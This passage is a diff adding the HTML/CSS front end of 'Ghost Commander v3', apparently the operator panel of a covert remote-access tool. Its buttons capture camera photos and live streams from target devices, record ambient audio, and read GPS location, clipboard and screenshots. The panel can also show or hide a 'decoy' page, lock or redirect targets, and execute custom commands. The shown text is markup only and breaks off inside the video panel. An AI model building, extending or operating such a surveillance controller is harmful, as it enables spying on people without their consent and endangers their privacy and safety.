@@ -1,0 +1,1156 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Ghost Commander v3</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Syne:wght@700;800&display=swap');
+:root{
+  --bg:#04060d;--surf:#080c18;--card:#0c1120;--border:#151f3a;--border2:#1e2d52;
+  --green:#00e5a0;--cyan:#00c8e5;--warn:#ff3d5a;--purple:#b467ff;--gold:#ffb726;
+  --red:#ff2244;--text:#c0d4f0;--muted:#3d5070;
+  --glow-g:0 0 18px rgba(0,229,160,.25);--glow-c:0 0 18px rgba(0,200,229,.25);
+  --glow-w:0 0 18px rgba(255,61,90,.25);--glow-p:0 0 18px rgba(180,103,255,.25);
+  --glow-r:0 0 24px rgba(255,34,68,.4)
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html,body{height:100%}
+body{font-family:'Space Mono',monospace;background:var(--bg);color:var(--text);min-height:100vh;overscroll-behavior:none;position:relative}
+body::before{content:'';position:fixed;inset:0;z-index:0;pointer-events:none;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.04) 2px,rgba(0,0,0,.04) 4px)}
+
+/* ── PASSWORD LOCK ── */
+#lockScreen{position:fixed;inset:0;z-index:9000;background:var(--bg);display:flex;flex-direction:column;align-items:center;justify-content:center;gap:24px}
+#lockScreen.unlocked{display:none}
+.lock-logo{font-family:'Syne',sans-serif;font-size:28px;font-weight:800;color:var(--green);letter-spacing:4px;text-shadow:var(--glow-g)}
+.lock-logo em{color:var(--warn);font-style:normal}
+.lock-sub{font-size:10px;color:var(--muted);letter-spacing:3px}
+.lock-dots{display:flex;gap:14px;margin:8px 0}
+.lock-dot{width:14px;height:14px;border-radius:50%;border:1.5px solid var(--border2);background:transparent;transition:all .15s}
+.lock-dot.filled{background:var(--green);border-color:var(--green);box-shadow:var(--glow-g)}
+.lock-dot.error{background:var(--warn);border-color:var(--warn);box-shadow:var(--glow-w)}
+.lock-pad{display:grid;grid-template-columns:repeat(3,1fr);gap:12px;width:240px}
+.lock-key{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:16px;text-align:center;font-family:'Syne',sans-serif;font-size:20px;font-weight:700;color:var(--text);cursor:pointer;user-select:none;transition:all .1s}
+.lock-key:active{transform:scale(.9);background:rgba(0,229,160,.08);border-color:var(--green);color:var(--green)}
+.lock-key.del{font-size:14px;color:var(--warn)}
+.lock-key.del:active{border-color:var(--warn);color:var(--warn)}
+.lock-err-msg{font-size:10px;color:var(--warn);letter-spacing:2px;min-height:16px;transition:opacity .3s}
+
+/* ── HEADER ── */
+.hdr{display:flex;align-items:center;justify-content:space-between;padding:12px 16px;background:rgba(8,12,24,.97);border-bottom:1px solid var(--border);position:sticky;top:0;z-index:300;backdrop-filter:blur(16px)}
+.logo{font-family:'Syne',sans-serif;font-size:18px;font-weight:800;color:var(--green);letter-spacing:3px;text-shadow:var(--glow-g)}
+.logo em{color:var(--warn);font-style:normal}
+.hdr-right{display:flex;align-items:center;gap:10px}
+.conn-pill{display:flex;align-items:center;gap:6px;background:var(--card);border:1px solid var(--border2);border-radius:100px;padding:5px 10px;font-size:10px;color:var(--muted);letter-spacing:1px}
+.dot{width:7px;height:7px;border-radius:50%;background:var(--green);box-shadow:var(--glow-g);animation:pulse 1.4s infinite}
+.dot.err{background:var(--warn);box-shadow:var(--glow-w)}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.25}}
+
+/* ── DEVICE BAR ── */
+.dev-bar{background:var(--surf);border-bottom:1px solid var(--border);padding:8px 16px;display:flex;gap:8px;overflow-x:auto;scrollbar-width:none}
+.dev-bar::-webkit-scrollbar{display:none}
+.dev-mini{flex-shrink:0;background:var(--card);border:1px solid var(--border);border-radius:8px;padding:6px 10px;font-size:10px;cursor:pointer;transition:all .15s;display:flex;align-items:center;gap:6px;white-space:nowrap}
+.dev-mini.online{border-color:var(--green);color:var(--green)}
+.dev-mini.offline{border-color:var(--muted);color:var(--muted)}
+.dev-mini.selected{background:rgba(0,229,160,.08);box-shadow:var(--glow-g)}
+.dev-mini.live-streaming{border-color:var(--red);color:var(--red);animation:livePulse 1s infinite}
+@keyframes livePulse{0%,100%{box-shadow:0 0 8px rgba(255,34,68,.3)}50%{box-shadow:0 0 20px rgba(255,34,68,.7)}}
+.dev-mini .dm-dot{width:5px;height:5px;border-radius:50%;background:currentColor}
+.dev-mini-empty{color:var(--muted);font-size:11px;padding:8px 0}
+
+/* ── TABS ── */
+.tabs{display:flex;background:var(--surf);border-bottom:1px solid var(--border);position:sticky;top:53px;z-index:200;overflow-x:auto;scrollbar-width:none}
+.tabs::-webkit-scrollbar{display:none}
+.tab{flex:1;padding:12px 6px;text-align:center;font-size:10px;letter-spacing:1px;cursor:pointer;color:var(--muted);border-bottom:2px solid transparent;transition:all .2s;user-select:none;min-width:72px;white-space:nowrap}
+.tab.active{color:var(--green);border-bottom-color:var(--green)}
+.tab#tab-live.active{color:var(--red);border-bottom-color:var(--red)}
+.tab:active{opacity:.7}
+.tab .badge{color:var(--warn);font-size:9px;margin-left:2px}
+.tab .live-badge{color:var(--red);font-size:9px;margin-left:2px;animation:pulse 1s infinite}
+
+.panel{display:none;padding:14px;max-width:540px;margin:0 auto}
+.panel.active{display:block}
+.sec-label{font-size:9px;color:var(--muted);letter-spacing:2.5px;text-transform:uppercase;margin-bottom:10px;padding-left:2px}
+.gap{margin-bottom:14px}
+
+/* ── TARGET ROW ── */
+.target-row{display:flex;gap:8px;margin-bottom:14px}
+.t-chip{flex:1;background:var(--card);border:1px solid var(--border);border-radius:10px;padding:10px 8px;text-align:center;font-size:11px;cursor:pointer;transition:all .15s}
+.t-chip.active{border-color:var(--green);color:var(--green);background:rgba(0,229,160,.06)}
+.t-chip .tl{font-size:9px;color:var(--muted);margin-bottom:3px;letter-spacing:1px}
+
+/* ── CMD GRID ── */
+.cmd-cat{margin-bottom:16px}
+.cmd-cat-title{font-size:9px;color:var(--muted);letter-spacing:2px;text-transform:uppercase;margin-bottom:8px;display:flex;align-items:center;gap:8px}
+.cmd-cat-title::after{content:'';flex:1;height:1px;background:var(--border)}
+.cmd-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
+.cmd-btn{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:12px 8px;text-align:center;cursor:pointer;transition:all .15s;font-family:'Space Mono',monospace;color:var(--text);display:flex;flex-direction:column;align-items:center;gap:5px}
+.cmd-btn:active{transform:scale(.95);opacity:.75}
+.cmd-btn .ci{font-size:24px}.cmd-btn .cn{font-size:11px;line-height:1.2}.cmd-btn .cl{font-size:9px;letter-spacing:1px;margin-top:2px}
+.g .cl{color:var(--green)}.g:hover{border-color:var(--green);box-shadow:var(--glow-g)}
+.c .cl{color:var(--cyan)}.c:hover{border-color:var(--cyan);box-shadow:var(--glow-c)}
+.w .cl{color:var(--warn)}.w:hover{border-color:var(--warn);box-shadow:var(--glow-w)}
+.p .cl{color:var(--purple)}.p:hover{border-color:var(--purple);box-shadow:var(--glow-p)}
+.gold .cl{color:var(--gold)}.gold:hover{border-color:var(--gold)}
+.r .cl{color:var(--red)}.r:hover{border-color:var(--red);box-shadow:var(--glow-r)}
+
+/* ── CUSTOM CMD ── */
+.custom-wrap{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px;margin-bottom:12px}
+.custom-label{font-size:9px;color:var(--muted);letter-spacing:2px;margin-bottom:8px}
+.custom-row{display:flex;gap:8px}
+.custom-in{flex:1;background:var(--surf);border:1px solid var(--border2);border-radius:8px;padding:10px 12px;color:var(--green);font-family:'Space Mono',monospace;font-size:12px;outline:none}
+.custom-in:focus{border-color:var(--green)}
+.custom-in::placeholder{color:var(--muted)}
+.send-btn{background:var(--green);border:none;border-radius:8px;padding:10px 14px;color:#000;font-family:'Syne',sans-serif;font-size:12px;font-weight:800;cursor:pointer;white-space:nowrap}
+.send-btn:active{opacity:.8}
+
+/* ── GALLERY ── */
+.gallery-tools{display:flex;gap:8px;margin-bottom:12px;align-items:center}
+.gallery-sel{flex:1;background:var(--card);border:1px solid var(--border);border-radius:8px;padding:8px 10px;color:var(--text);font-family:'Space Mono',monospace;font-size:11px;outline:none}
+.gallery-sel option{background:var(--card)}
+.gallery-ref{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:8px 14px;color:var(--green);font-family:'Space Mono',monospace;font-size:16px;cursor:pointer}
+.gallery-ref:active{opacity:.7}
+.gallery-cnt{font-size:10px;color:var(--muted);margin-bottom:10px}
+.gallery-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:8px;margin-bottom:16px}
+.g-item{background:var(--card);border:1px solid var(--border);border-radius:10px;overflow:hidden;cursor:pointer;transition:border-color .2s}
+.g-item:active{border-color:var(--purple)}
+.g-item img{width:100%;aspect-ratio:4/3;object-fit:cover;display:block}
+.g-item-info{padding:7px 9px}
+.g-type{font-size:9px;color:var(--purple);letter-spacing:1px}
+.g-time{font-size:9px;color:var(--muted);margin-top:2px}
+.g-dev{font-size:9px;color:var(--muted);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.gallery-empty{text-align:center;padding:48px 16px;color:var(--muted);font-size:12px;border:1px dashed var(--border);border-radius:12px}
+
+/* ── FEED ── */
+.feed-wrap{background:var(--card);border:1px solid var(--border);border-radius:12px;overflow:hidden}
+.feed-hdr{display:flex;align-items:center;justify-content:space-between;padding:11px 14px;border-bottom:1px solid var(--border);font-size:10px;color:var(--muted);letter-spacing:1px}
+.clr-btn{background:none;border:1px solid transparent;border-radius:4px;color:var(--warn);font-family:'Space Mono',monospace;font-size:10px;cursor:pointer;padding:2px 8px}
+.clr-btn:hover{border-color:var(--warn)}
+.feed-list{max-height:66vh;overflow-y:auto}
+.feed-list::-webkit-scrollbar{width:3px}
+.feed-list::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+.f-item{border-bottom:1px solid var(--border);padding:11px 14px;animation:slideUp .3s ease}
+@keyframes slideUp{from{opacity:0;transform:translateY(-6px)}to{opacity:1;transform:none}}
+.f-meta{display:flex;align-items:center;justify-content:space-between;margin-bottom:7px}
+.f-badge{font-size:9px;padding:2px 9px;border-radius:100px;letter-spacing:1.5px;background:rgba(0,200,229,.08);border:1px solid var(--cyan);color:var(--cyan);text-transform:uppercase}
+.f-badge.photo{background:rgba(180,103,255,.08);border-color:var(--purple);color:var(--purple)}
+.f-badge.location{background:rgba(0,229,160,.08);border-color:var(--green);color:var(--green)}
+.f-badge.audio{background:rgba(255,61,90,.08);border-color:var(--warn);color:var(--warn)}
+.f-badge.live{background:rgba(255,34,68,.08);border-color:var(--red);color:var(--red)}
+.f-time{font-size:9px;color:var(--muted)}
+.f-dev{font-size:9px;color:var(--muted);margin-bottom:6px}
+.f-body{font-size:11px;color:var(--text);word-break:break-all;line-height:1.65}
+.f-body pre{white-space:pre-wrap;font-size:10px;color:var(--green)}
+.f-img{width:100%;max-height:190px;object-fit:contain;border-radius:8px;border:1px solid var(--border);margin-top:8px;cursor:zoom-in}
+.f-audio{width:100%;margin-top:8px;height:34px}
+.loc-link{display:inline-block;margin-top:6px;color:var(--green);text-decoration:none;font-size:11px;border:1px solid var(--green);padding:4px 12px;border-radius:6px}
+.save-btn{margin-top:7px;background:rgba(0,229,160,.08);border:1px solid var(--green);color:var(--green);font-family:'Space Mono',monospace;font-size:10px;padding:4px 12px;border-radius:6px;cursor:pointer;display:inline-block}
+.save-btn:active{opacity:.7}
+.f-empty{padding:32px 16px;text-align:center;color:var(--muted);font-size:12px}
+
+/* ── LIVE PANEL ── */
+.live-panel-inner{max-width:540px;margin:0 auto}
+.live-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}
+.live-title{font-family:'Syne',sans-serif;font-size:16px;font-weight:800;color:var(--red);letter-spacing:2px;display:flex;align-items:center;gap:8px}
+.live-rec-dot{width:10px;height:10px;border-radius:50%;background:var(--red);animation:pulse .8s infinite;display:none}
+.live-device-sel{background:var(--card);border:1px solid var(--border2);border-radius:8px;padding:8px 10px;color:var(--text);font-family:'Space Mono',monospace;font-size:10px;outline:none}
+.live-device-sel option{background:var(--card)}
+.live-viewport{position:relative;background:#000;border-radius:14px;overflow:hidden;border:1.5px solid var(--border2);margin-bottom:12px;aspect-ratio:4/3;display:flex;align-items:center;justify-content:center}
+.live-viewport.streaming{border-color:var(--red);box-shadow:var(--glow-r)}
+#liveImg{width:100%;height:100%;object-fit:contain;display:none}
+.live-overlay{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;flex-direction:column;gap:10px;color:var(--muted);font-size:12px;text-align:center;pointer-events:none}
+.live-overlay.hidden{display:none}
+.live-hud{position:absolute;top:8px;left:8px;right:8px;display:flex;align-items:center;justify-content:space-between;pointer-events:none}
+.live-hud-pill{background:rgba(0,0,0,.65);border:1px solid rgba(255,34,68,.4);border-radius:100px;padding:3px 10px;font-size:9px;color:var(--red);letter-spacing:1.5px;display:flex;align-items:center;gap:5px;backdrop-filter:blur(6px)}
+.live-hud-pill.hidden{display:none}
+.live-fps-hud{background:rgba(0,0,0,.65);border:1px solid var(--border2);border-radius:100px;padding:3px 10px;font-size:9px;color:var(--muted);backdrop-filter:blur(6px);display:none}
+.live-watermark{position:absolute;bottom:8px;right:8px;font-size:8px;color:rgba(255,34,68,.4);letter-spacing:1px;pointer-events:none}
+.live-controls{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:12px}
+.live-btn{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:12px 8px;text-align:center;cursor:pointer;transition:all .15s;font-family:'Space Mono',monospace;color:var(--text);display:flex;flex-direction:column;align-items:center;gap:5px}
+.live-btn .lbi{font-size:22px}.live-btn .lbn{font-size:11px}.live-btn .lbl{font-size:9px;letter-spacing:1px;margin-top:2px}
+.live-btn:active{transform:scale(.95);opacity:.75}
+.live-btn.start{border-color:var(--red);color:var(--red);background:rgba(255,34,68,.06)}
+.live-btn.start:hover{box-shadow:var(--glow-r)}
+.live-btn.startf{border-color:var(--purple);color:var(--purple);background:rgba(180,103,255,.06)}
+.live-btn.startf:hover{box-shadow:var(--glow-p)}
+.live-btn.stop{border-color:var(--warn);color:var(--warn);background:rgba(255,61,90,.06)}
+.live-btn.stop:hover{box-shadow:var(--glow-w)}
+.live-btn.snap{border-color:var(--green);color:var(--green);background:rgba(0,229,160,.06)}
+.live-btn.snap:hover{box-shadow:var(--glow-g)}
+.live-stats{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:12px 14px;display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:12px;font-size:10px}
+.live-stat{text-align:center}
+.live-stat .lsv{font-size:16px;font-weight:700;font-family:'Syne',sans-serif;color:var(--green)}
+.live-stat .lsl{color:var(--muted);font-size:9px;margin-top:2px;letter-spacing:1px}
+.live-sql-note{background:rgba(255,34,68,.05);border:1px solid rgba(255,34,68,.2);border-radius:10px;padding:12px;font-size:10px;color:var(--muted);line-height:1.8;margin-top:8px}
+.live-sql-note strong{color:var(--red)}
+.live-sql-note code{background:rgba(0,0,0,.4);padding:2px 5px;border-radius:4px;color:var(--green);font-size:9px}
+/* ── DURATION BUTTONS ── */
+.dur-btn{background:var(--card);border:1px solid var(--border);border-radius:8px;padding:8px 14px;color:var(--muted);font-family:'Space Mono',monospace;font-size:12px;cursor:pointer;transition:all .15s}
+.dur-btn.active{border-color:var(--red);color:var(--red);background:rgba(255,34,68,.08)}
+.dur-btn:active{opacity:.7}
+/* ── VIDEO CARD ── */
+.vid-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:14px;animation:slideUp .3s ease}
+.vid-card video{width:100%;border-radius:8px;margin:10px 0;max-height:220px;background:#000}
+.vid-meta{font-size:10px;color:var(--muted);line-height:1.8}
+.vid-dl{display:inline-block;margin-top:8px;background:rgba(0,229,160,.08);border:1px solid var(--green);color:var(--green);font-family:'Space Mono',monospace;font-size:10px;padding:5px 14px;border-radius:6px;cursor:pointer}
+.vid-dl:active{opacity:.7}
+
+
+/* ── DEVICES PANEL ── */
+.dev-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:14px 16px;margin-bottom:8px;cursor:pointer;transition:all .2s;display:flex;align-items:center;gap:12px}
+.dev-card.online{border-color:rgba(0,229,160,.3)}
+.dev-card.selected{border-color:var(--green);box-shadow:var(--glow-g),inset 0 0 20px rgba(0,229,160,.04)}
+.dev-card.live-on{border-color:var(--red)!important;animation:livePulse 1s infinite}
+.dev-card:active{opacity:.8}
+.dev-icon{font-size:28px}
+.dev-id{font-size:12px;color:var(--green);word-break:break-all}
+.dev-seen{font-size:10px;color:var(--muted);margin-top:3px}
+.dev-bat{font-size:10px;color:var(--gold);margin-top:2px}
+.dev-pill{margin-left:auto;font-size:9px;padding:3px 9px;border-radius:100px;border:1px solid var(--green);color:var(--green);background:rgba(0,229,160,.07);white-space:nowrap;flex-shrink:0}
+.dev-pill.offline{border-color:var(--muted);color:var(--muted);background:none}
+.dev-pill.live-pill{border-color:var(--red);color:var(--red);background:rgba(255,34,68,.07);animation:pulse .8s infinite}
+.no-devs{text-align:center;padding:28px 16px;color:var(--muted);font-size:12px;border:1px dashed var(--border);border-radius:12px;line-height:1.8}
+.setup-card{background:rgba(180,103,255,.05);border:1px solid rgba(180,103,255,.25);border-radius:12px;padding:14px;margin-bottom:14px;font-size:11px;line-height:1.9;color:var(--text)}
+.setup-card strong{color:var(--purple)}
+.setup-card code{background:rgba(0,0,0,.45);padding:2px 6px;border-radius:4px;color:var(--green);font-size:10px}
+.sql-block{background:rgba(0,0,0,.5);border:1px solid var(--border2);border-radius:8px;padding:12px;margin-top:10px;overflow-x:auto}
+.sql-block pre{font-family:'Space Mono',monospace;font-size:9px;color:var(--green);white-space:pre;line-height:1.7}
+.copy-sql-btn{margin-top:8px;background:rgba(0,229,160,.08);border:1px solid var(--green);color:var(--green);font-family:'Space Mono',monospace;font-size:10px;padding:5px 14px;border-radius:6px;cursor:pointer}
+.copy-sql-btn:active{opacity:.7}
+.stats-row{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:14px}
+.stat-card{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:12px 14px}
+.stat-val{font-size:22px;font-weight:700;color:var(--green);font-family:'Syne',sans-serif}
+.stat-lbl{font-size:10px;color:var(--muted);margin-top:3px;letter-spacing:1px}
+
+/* ── LIGHTBOX ── */
+#lb{display:none;position:fixed;inset:0;z-index:999;background:rgba(0,0,0,.97);flex-direction:column;align-items:center;justify-content:center}
+#lb.open{display:flex;animation:fadeIn .2s ease}
+@keyframes fadeIn{from{opacity:0}to{opacity:1}}
+.lb-top{position:absolute;top:0;left:0;right:0;display:flex;align-items:center;justify-content:space-between;padding:14px 16px;background:linear-gradient(to bottom,rgba(0,0,0,.85),transparent)}
+.lb-title{font-family:'Syne',sans-serif;font-size:13px;color:var(--text)}
+.lb-acts{display:flex;gap:8px}
+.lb-btn{background:rgba(255,255,255,.07);border:1px solid rgba(255,255,255,.12);border-radius:8px;padding:7px 14px;color:var(--text);font-family:'Space Mono',monospace;font-size:11px;cursor:pointer}
+.lb-btn.dl{background:rgba(0,229,160,.1);border-color:var(--green);color:var(--green)}
+.lb-btn.cls{background:rgba(255,61,90,.1);border-color:var(--warn);color:var(--warn)}
+#lbImg{max-width:96vw;max-height:80vh;object-fit:contain;border-radius:8px}
+.lb-bot{position:absolute;bottom:0;left:0;right:0;padding:14px 16px;background:linear-gradient(to top,rgba(0,0,0,.85),transparent);font-size:10px;color:var(--muted);text-align:center}
+
+/* ── TOAST ── */
+.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:var(--card);border:1px solid var(--border2);color:var(--text);font-family:'Space Mono',monospace;font-size:12px;padding:10px 20px;border-radius:8px;z-index:9999;box-shadow:0 4px 24px rgba(0,0,0,.7);white-space:nowrap;animation:slideUp .2s ease}
+</style>
+</head>
+<body>
+
+<!-- ══ PASSWORD LOCK SCREEN ══ -->
+<div id="lockScreen">
+  <div class="lock-logo">GHOST<em>CMD</em></div>
+  <div class="lock-sub">ENTER ACCESS CODE</div>
+  <div class="lock-dots">
+    <div class="lock-dot" id="ld0"></div>
+    <div class="lock-dot" id="ld1"></div>
+    <div class="lock-dot" id="ld2"></div>
+    <div class="lock-dot" id="ld3"></div>
+  </div>
+  <div class="lock-err-msg" id="lockErr">&nbsp;</div>
+  <div class="lock-pad">
+    <button class="lock-key" onclick="lockInput('1')">1</button>
+    <button class="lock-key" onclick="lockInput('2')">2</button>
+    <button class="lock-key" onclick="lockInput('3')">3</button>
+    <button class="lock-key" onclick="lockInput('4')">4</button>
+    <button class="lock-key" onclick="lockInput('5')">5</button>
+    <button class="lock-key" onclick="lockInput('6')">6</button>
+    <button class="lock-key" onclick="lockInput('7')">7</button>
+    <button class="lock-key" onclick="lockInput('8')">8</button>
+    <button class="lock-key" onclick="lockInput('9')">9</button>
+    <div></div>
+    <button class="lock-key" onclick="lockInput('0')">0</button>
+    <button class="lock-key del" onclick="lockBackspace()">⌫</button>
+  </div>
+</div>
+
+<!-- ══ MAIN APP ══ -->
+<div id="app" style="display:none">
+
+<!-- HEADER -->
+<div class="hdr">
+  <div class="logo">GHOST<em>CMD</em> <span style="font-size:10px;color:var(--red);letter-spacing:1px">v3</span></div>
+  <div class="hdr-right">
+    <div class="conn-pill">
+      <div class="dot" id="liveDot"></div>
+      <span id="connTxt">CONNECTING</span>
+    </div>
+  </div>
+</div>
+
+<!-- DEVICE BAR -->
+<div class="dev-bar" id="devBar"><div class="dev-mini-empty">Scanning…</div></div>
+
+<!-- TABS -->
+<div class="tabs">
+  <div class="tab active" id="tab-cmd"     onclick="switchTab('cmd')">⚡ CMD</div>
+  <div class="tab"        id="tab-video"    onclick="switchTab('video')">📹 VIDEO</div>
+  <div class="tab"        id="tab-devices" onclick="switchTab('devices')">📡 DEVICES</div>
+  <div class="tab"        id="tab-gallery" onclick="switchTab('gallery')">🖼 GALLERY</div>
+  <div class="tab"        id="tab-feed"    onclick="switchTab('feed')">📥 FEED</div>
+</div>
+
+<!-- ══ COMMANDS ══ -->
+<div class="panel active" id="panel-cmd">
+  <div class="sec-label gap" style="margin-top:4px">🎯 Target</div>
+  <div class="target-row">
+    <div class="t-chip active" id="chipAll" onclick="setTarget('all')"><div class="tl">BROADCAST</div>All Devices</div>
+    <div class="t-chip" id="chipOne" onclick="setTarget('one')"><div class="tl">SPECIFIC</div><span id="chipOneLabel">Select from Devices ↓</span></div>
+  </div>
+
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">📷 Camera</div>
+    <div class="cmd-grid">
+      <button class="cmd-btn p" onclick="sendCmd('capture')"><span class="ci">📷</span><span class="cn">Rear Photo</span><span class="cl">CAPTURE</span></button>
+      <button class="cmd-btn p" onclick="sendCmd('selfie')"><span class="ci">🤳</span><span class="cn">Selfie</span><span class="cl">FRONT CAM</span></button>
+      <button class="cmd-btn p" onclick="sendCmd('burst','3')"><span class="ci">📸</span><span class="cn">Burst Rear</span><span class="cl">3 SHOTS</span></button>
+      <button class="cmd-btn p" onclick="sendCmd('burst_front','3')"><span class="ci">🔄</span><span class="cn">Burst Front</span><span class="cl">3 SHOTS</span></button>
+    </div>
+  </div>
+
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">📹 Live Stream</div>
+    <div class="cmd-grid">
+      <button class="cmd-btn r" onclick="sendVideoCmd('environment')"><span class="ci">📹</span><span class="cn">Live Rear</span><span class="cl">STREAM</span></button>
+      <button class="cmd-btn r" onclick="sendVideoCmd('user')"><span class="ci">🎥</span><span class="cn">Live Front</span><span class="cl">SELFIE CAM</span></button>
+      <button class="cmd-btn w" onclick="sendCmd('live_stop')"><span class="ci">⏹</span><span class="cn">Stop Stream</span><span class="cl">HALT</span></button>
+      <button class="cmd-btn c" onclick="switchTab('video')"><span class="ci">👁</span><span class="cn">View Live</span><span class="cl">OPEN LIVE</span></button>
+    </div>
+  </div>
+
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">🎙️ Audio</div>
+    <div class="cmd-grid">
+      <button class="cmd-btn w" onclick="sendCmd('audio','5')"><span class="ci">🎙️</span><span class="cn">Record 5s</span><span class="cl">AMBIENT</span></button>
+      <button class="cmd-btn w" onclick="sendCmd('audio','15')"><span class="ci">🔴</span><span class="cn">Record 15s</span><span class="cl">EXTENDED</span></button>
+    </div>
+  </div>
+
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">📍 Location & Sensors</div>
+    <div class="cmd-grid">
+      <button class="cmd-btn g" onclick="sendCmd('location')"><span class="ci">📍</span><span class="cn">GPS Location</span><span class="cl">COORDS</span></button>
+      <button class="cmd-btn g" onclick="sendCmd('orientation')"><span class="ci">🧭</span><span class="cn">Orientation</span><span class="cl">TILT/ROTATE</span></button>
+    </div>
+  </div>
+
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">📊 Device Intel</div>
+    <div class="cmd-grid">
+      <button class="cmd-btn c" onclick="sendCmd('status')"><span class="ci">📊</span><span class="cn">Full Status</span><span class="cl">SYSTEM INFO</span></button>
+      <button class="cmd-btn c" onclick="sendCmd('battery')"><span class="ci">🔋</span><span class="cn">Battery</span><span class="cl">LEVEL</span></button>
+      <button class="cmd-btn c" onclick="sendCmd('network')"><span class="ci">📶</span><span class="cn">Network</span><span class="cl">WIFI/CELL</span></button>
+      <button class="cmd-btn c" onclick="sendCmd('storage')"><span class="ci">💾</span><span class="cn">Storage</span><span class="cl">DISK USAGE</span></button>
+      <button class="cmd-btn c" onclick="sendCmd('clipboard')"><span class="ci">📋</span><span class="cn">Clipboard</span><span class="cl">READ</span></button>
+      <button class="cmd-btn c" onclick="sendCmd('screenshot')"><span class="ci">🖥️</span><span class="cn">Screenshot</span><span class="cl">SCREEN CAP</span></button>
+    </div>
+  </div>
+
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">⚡ Interaction</div>
+    <div class="cmd-grid">
+      <button class="cmd-btn gold" onclick="sendCmd('ping')"><span class="ci">🏓</span><span class="cn">Ping</span><span class="cl">ALIVE CHECK</span></button>
+      <button class="cmd-btn gold" onclick="sendCmd('vibrate')"><span class="ci">📳</span><span class="cn">Vibrate</span><span class="cl">BUZZ</span></button>
+      <button class="cmd-btn gold" onclick="sendCmd('vibrate_sos')"><span class="ci">🆘</span><span class="cn">Vibrate SOS</span><span class="cl">MORSE</span></button>
+      <button class="cmd-btn gold" onclick="sendCmd('flash')"><span class="ci">💡</span><span class="cn">Flash Screen</span><span class="cl">BLINK</span></button>
+      <button class="cmd-btn gold" onclick="promptAlert()"><span class="ci">⚠️</span><span class="cn">Alert Popup</span><span class="cl">MESSAGE</span></button>
+      <button class="cmd-btn gold" onclick="promptSpeak()"><span class="ci">🔊</span><span class="cn">Speak</span><span class="cl">TEXT-TO-SPEECH</span></button>
+    </div>
+  </div>
+
+  <div class="cmd-cat">
+    <div class="cmd-cat-title">🔧 Control</div>
+    <div class="cmd-grid">
+      <button class="cmd-btn w" onclick="sendCmd('lock')"><span class="ci">🔒</span><span class="cn">Lock</span><span class="cl">FREEZE UI</span></button>
+      <button class="cmd-btn g" onclick="sendCmd('unlock')"><span class="ci">🔓</span><span class="cn">Unlock</span><span class="cl">RESTORE</span></button>
+      <button class="cmd-btn w" onclick="sendCmd('hide_decoy')"><span class="ci">🫥</span><span class="cn">Hide Decoy</span><span class="cl">BLANK PAGE</span></button>
+      <button class="cmd-btn g" onclick="sendCmd('show_decoy')"><span class="ci">👁️</span><span class="cn">Show Decoy</span><span class="cl">RESTORE UI</span></button>
+      <button class="cmd-btn w" onclick="sendCmd('reload')"><span class="ci">🔄</span><span class="cn">Reload Page</span><span class="cl">REFRESH</span></button>
+      <button class="cmd-btn w" onclick="promptRedirect()"><span class="ci">↗️</span><span class="cn">Redirect</span><span class="cl">OPEN URL</span></button>
+    </div>
+  </div>
+
+  <div class="custom-wrap">
+    <div class="custom-label">// CUSTOM COMMAND</div>
+    <div class="custom-row">
+      <input class="custom-in" id="customIn" placeholder="command [param]…" onkeydown="if(event.key==='Enter')sendCustom()">
+      <button class="send-btn" onclick="sendCustom()">EXEC</button>
+    </div>
+  </div>
+</div>
+
+<!-- ══ VIDEO RECORDING PANEL ══ -->
+<div class="panel" id="panel-video">
+  <div class="live-panel-inner">
+    <div class="live-header">
+      <div class="live-title">
+        <div class="live-rec-dot" id="vidRecDot"></div>
+        VIDEO REC
+      </div>
+    </div>
+
+    <!-- Duration picker -->
+    <div style="background:var(--card);border:1px solid var(--border);border-radius:12px;padding:14px;margin-bottom:12px">
+      <div style="font-size:9px;color:var(--muted);letter-spacing:2px;margin-bottom:10px">DURATION</div>
+      <div style="display:flex;gap:8px;flex-wrap:wrap">
+        <button class="dur-btn active" id="dur5"  onclick="setDur(5)"  >5s</button>
+        <button class="dur-btn"        id="dur10" onclick="setDur(10)" >10s</button>
+        <button class="dur-btn"        id="dur20" onclick="setDur(20)" >20s</button>
+        <button class="dur-btn"        id="dur30" onclick="setDur(30)" >30s</button>
+        <button class="dur-btn"        id="dur60" onclick="setDur(60)" >60s</button>
+      </div>
+    </div>
+
+    <!-- Record buttons -->
+    <div class="live-controls" style="grid-template-columns:1fr 1fr;margin-bottom:12px">
+      <button class="live-btn start"  onclick="sendVideoCmd('environment')"><span class="lbi">📹</span><span class="lbn">Rear Camera</span><span class="lbl">RECORD</span></button>
+      <button class="live-btn startf" onclick="sendVideoCmd('user')"><span class="lbi">🤳</span><span class="lbn">Front Camera</span><span class="lbl">SELFIE</span></button>
